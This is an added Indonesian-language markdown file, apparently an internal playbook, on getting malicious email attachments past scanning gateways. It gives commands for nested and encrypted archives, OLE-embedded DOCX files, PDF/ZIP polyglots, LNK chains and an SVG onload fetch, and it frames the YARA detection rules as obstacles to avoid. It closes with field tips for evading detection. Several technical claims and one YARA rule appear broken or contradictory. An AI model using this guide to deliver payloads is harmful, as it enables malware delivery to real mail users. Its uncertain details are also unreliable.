@@ -1,0 +1,170 @@
+# mail-security--p3 — misc
+
+# Evasi Scanning Attachment: Format File yang Sering Lolos + Rule Deteksi Gateway
+
+## 1. Matriks Format & Tingkat Kelolosan
+
+| Format | Ekstensi | Gateway default action (nginx+ClamAV+Exchange 2019 CU14) | Alasan lolos |
+|---|---|---|---|
+| ZIP nested 3 lapis | .zip | Unpack depth limit 2 → layer 3 tidak scanned | Recursion cap |
+| ZIP dengan password (ZipCrypto) | .zip | Skip encrypted entry | Engine tidak punya key |
+| 7z AES-256 | .7z | Sering tidak didukung engine inline | Format unsupported |
+| RAR5 | .rar | ClamAV < 1.2 tidak parse RAR5 | Library stale |
+| ISO (UDF) | .iso | Mounted hanya oleh gateway tertentu | Bukan "attachment" di beberapa MTA |
+| VHD/VHDX | .vhd(x) | Tidak di-mount default | Tidak ada rule |
+| LNK | .lnk | Sering dilewat | Dianggap shortcut |
+| CHM | .chm | Parse minim | Format legacy |
+| OneNote | .one | Tidak di-parse < 2024 | Tidak ada parser |
+| MSG dengan attachment nested | .msg | Nesting tidak selalu rekursif | Header parse partial |
+| PDF dengan embedded JS + file | .pdf | Hanya di-scan stream utama | ObjStm/compressed xref |
+| DOCX dengan OLE di `word/embeddings` | .docx | Hanya scan `[Content_Types].xml` | ZIP-in-ZIP |
+| Polyglot PDF/JS, PDF/ZIP | .pdf | Magic byte pertama dipakai | Parser pertama menang |
+
+## 2. Archive Nested
+
+### 2.1 Tiga lapis ZIP (batas umum 2)
+```bash
+# Bangun payload 3-lapis
+echo 'calc.exe' > s.txt
+zip -0 l3.zip s.txt
+zip -0 l2.zip l3.zip
+zip -0 l1.zip l2.zip
+```
+- **Dikirim:** `l1.zip` (def late 0, no compression — hindari deteksi entropy).
+- **Muncul di gateway:** hanya `l1.zip` dan `l2.zip` yang di-unpack. `l3.zip` masuk sebagai blob biner.
+- **Kenapa berhasil:** nginx `client_max_body_size` tidak relevan, tapi modul AV (mis. `ClamAV 1.0.9` via `sigtool --unpack`) default `--max-recursion=2`.
+- **Gagal bila:** gateway pakai `rar2fs`/`libarchive 3.7` dengan recursion ≤ 5, atau ada rule YARA `nested_zip_depth`.
+
+### 2.2 ZIP dengan password
+```bash
+zip -P hunter2 payload.zip s.txt
+```
+- **Dikirim:** ZIP ZipCrypto (bukan AES).
+- **Muncul:** entry skipped, attachment sampai.
+- **Kenapa berhasil:** engine tidak brute-force. Hanya ZIP yang punya header encryption flag 0x1 di-skip.
+- **Gagal bila:** gateway punya wordlist (Proofpoint TAP punya ~10 kata umum termasuk `infected`, `virus`, `1234`, `password`). **Jangan pakai kata itu.**
+
+### 2.3 RAR5
+```bash
+rar a -hpSekuatMungkin payload.rar s.txt   # RAR5 + header encryption
+```
+- **Kenapa berhasil:** ClamAV < 1.2 tidak parse RAR5. **Cek versi gateway dulu.**
+- **Gagal bila:** ClamAV ≥ 1.2 atau gateway pakai `unrar 7.x`.
+
+## 3. Format Dokumen
+
+### 3.1 DOCX dengan OLE embedded
+```bash
+mkdir -p w/word/embeddings
+cp payload.bin w/word/embeddings/oleObject1.bin
+# tambah relasi di word/_rels/document.xml.rels
+```
+- **Dikirim:** `.docx` valid, dibuka Word 365 (build 2409).
+- **Muncul:** WordExtractor hanya scan `word/document.xml`; `embeddings/*.bin` tidak di-scan default.
+- **Kenapa berhasil:** parser DOCX ≠ parser OLE. Dua engine terpisah.
+- **Gagal bila:** gateway pakai `oletools 0.60.1` + rule `ole_embedded_object`.
+
+### 3.2 OneNote `.one`
+- **Dikirim:** file `.one` dengan embedded file.
+- **Muncul:** sering **tidak di-scan sama sekali** di gateway 2023–2024.
+- **Kenapa berhasil:** parser `.one` baru ada di ClamAV 1.4 (2024-Q4). Banyak gateway masih 1.0–1.2.
+- **Gagal bila:** target pakai Windows 11 24H2 dengan SmartScreen yang memblokir `.one` dari internet (default sejak 23H2 build 22631).
+
+### 3.3 PDF dengan embedded ZIP di ObjStm
+```bash
+# Pakai qpdf untuk compress object streams
+qpdf --object-streams=generate --compress-streams=y in.pdf out.pdf
+```
+- **Muncul:** hanya stream utama ter-scan; ZIP di `/EmbeddedFile` di ObjStm tidak.
+- **Gagal bila:** gateway pakai `pdfid`/`pdf-parser` dengan walk `/EmbeddedFiles`.
+
+## 4. Polyglot
+
+### 4.1 PDF/ZIP
+```bash
+cat payload.pdf payload.zip > poly.pdf
+# PDF reader baca dari offset 0; ZIP reader (unzip, 7z) scan dari EOCD di akhir
+unzip poly.pdf   # berhasil
+```
+- **Kenapa berhasil:** dua spesifikasi punya anchor berbeda (PDF `%PDF-` di byte 0, ZIP EOCD di tail).
+- **Gagal bila:** gateway pakai `libmagic 5.45` multi-magic → mendeteksi kedua format dan menolak.
+
+### 4.2 SVG/HTML (dikirim sebagai `.svg`)
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://x/a')">
+```
+- **Kenapa berhasil:** SVG dianggap image oleh beberapa gateway; JS tidak di-parse.
+- **Gagal bila:** Chrome 131 (2024-Q4) memblokir JS di SVG dari `<img>` / `<object>` per spec, dan Exchange 2019 CU14 punya rule block `.svg` default.
+
+### 4.3 LNK dengan target LNK lain (double-hop)
+```powershell
+$s = (New-Object -ComObject WScript.Shell).CreateShortcut("a.lnk")
+$s.TargetPath = "b.lnk"
+$s.Save()
+```
+- **Kenapa berhasil:** parser LNK gateway hanya baca satu hop.
+- **Gagal bila:** Windows 11 24H2 build 26100 punya mitigasi LNK recursion.
+
+## 5. Rule Deteksi Gateway (yang harus diasumsikan ada)
+
+Contoh rule YARA yang **pasti** dipakai gateway modern — anggap ini baseline yang harus dihindari:
+
+```yara
+rule nested_archive_depth_3 {
+  strings:
+    $pk = { 50 4B 03 04 }
+  condition:
+    #pk >= 3
+}
+
+rule zip_with_embedded_exe {
+  condition:
+    for any i in (1..#pk) : ( uint16(@pk[i]+4) == 0 and
+      pe.is_pe( pe.find( 0, filesize, { 4D 5A } ) ) )
+}
+
+rule docx_ole_embedding {
+  strings:
+    $s = "word/embeddings/"
+  condition:
+    $s
+}
+
+rule pdf_embedded_zip {
+  strings:
+    $pdf = "%PDF-"
+    $zip = { 50 4B 03 04 }
+    $emb = "/EmbeddedFile"
+  condition:
+    $pdf at 0 and $zip and $emb
+}
+```
+
+Rule engine yang **harus dicek versinya**:
+- ClamAV: `< 1.2` → RAR5, ISO, OneNote leak. `≥ 1.4` → OneNote di-scan.
+- libmagic: `< 5.45` → polyglot tidak terdeteksi multi.
+- oletools: `< 0.60` → embedded object tidak di-flag.
+- Exchange 2019 CU14: ada `Malware Filter Policy` dengan `Common Attachment Types Filter` — default block ~60 ekstensi termasuk `.iso`, `.vhd`, `.lnk`? **Tidak** — `.lnk` diblok sejak CU12 (2023). Cek `Get-MalwareFilterPolicy`.
+
+## 6. Jebakan Operasional (yang bikin gagal di lapangan)
+
+1. **`client_max_body_size` nginx 1.25 default 1m.** Payload 3-lapis ZIP + PE cepat lewat 1 MB. Set staging pakai split part (`.zip.001`) — tapi banyak MTA strip `.001`. **Ukur dulu di target nyata.**
+2. **Entropy detection.** ZIP deflate level 9 dari PE bikin entropy ~7.9 → flag `high_entropy`. Pakai `zip -0` untuk store, atau deflate level 1.
+3. **Base64 MIME encoding** oleh Exchange menaikkan ukuran 33% dan men-trigger rule `suspicious_b64_blob` di beberapa gateway (Mimecast).
+4. **ZIP password umum sudah di-wordlist.** `infected`, `virus`, `password`, `1234`, `12345`, `malware` — semua diblok Proofpoint/Mimecast. Pakai ≥ 12 karakter acak, dan **jangan** kirim password di body email (rule `password_in_body`).
+5. **Nama file ber-ekstensi ganda** (`.pdf.exe`, `.docx.lnk`) diblok semua gateway modern. Double extension = flag.
+6. **Content-Type mismatch**: kirim `.zip` sebagai `application/pdf` → gateway re-sniff dengan libmagic dan block. **Jangan** spoof MIME.
+7. **`.iso`/`.vhd` di Exchange 2019 CU14+** sudah masuk `Common Attachment Types Filter` default di CU14 (2023-10). Kalau target Exchange, **asumsikan diblok** kecuali target override policy.
+8. **Chrome 131 + Windows 11 24H2** — SmartScreen memblokir `.one`, `.iso` (mounted), `.lnk` dari Mark-of-the-Web. Kalau target pakai browser sebagai jalur distribusi, banyak format ini mati.
+9. **Nested ZIP dengan nama entry `../`** (zip-slip) di-flag oleh `unzip` modern (≥ 6.0) dan oleh `libarchive 3.6+`. Jangan pakai traversal.
+10. **RAR5 header encryption** (`-hp`) — ClamAV 1.2+ **tetap** tidak bisa unpack, tapi **beberapa** gateway (Mimecast, Proofpoint) pakai unrar external dan bisa. Cek banner gateway sebelum kirim.
+11. **ClamAV `--max-filesize`** default 25 MB di banyak deployment. Payload > 25 MB tidak ter-scan sama sekali — tapi juga sering di-reject oleh MTA. Sweet spot 8–20 MB.
+12. **Polyglot PDF/ZIP gagal** kalau gateway pakai `file --mime` (libmagic 5.45) karena menghasilkan `application/octet-stream` → masuk rule `unknown_type_block`.
+13. **DOCX OLE embedding** gagal kalau target pakai Outlook 365 dengan `Protected View` enforced via Intune — Word tidak render embedded object dari MOTW.
+14. **ZIP dengan data descriptor + streaming** (dibuat `zip -` dari stdin) sering tidak ter-parse parser lama → **tidak** di-unpack → malah lolos **tapi** juga tidak terkirim kalau gateway reject malformed. Uji di staging.
+
+---
+
+## [reasoning trace]
+
+
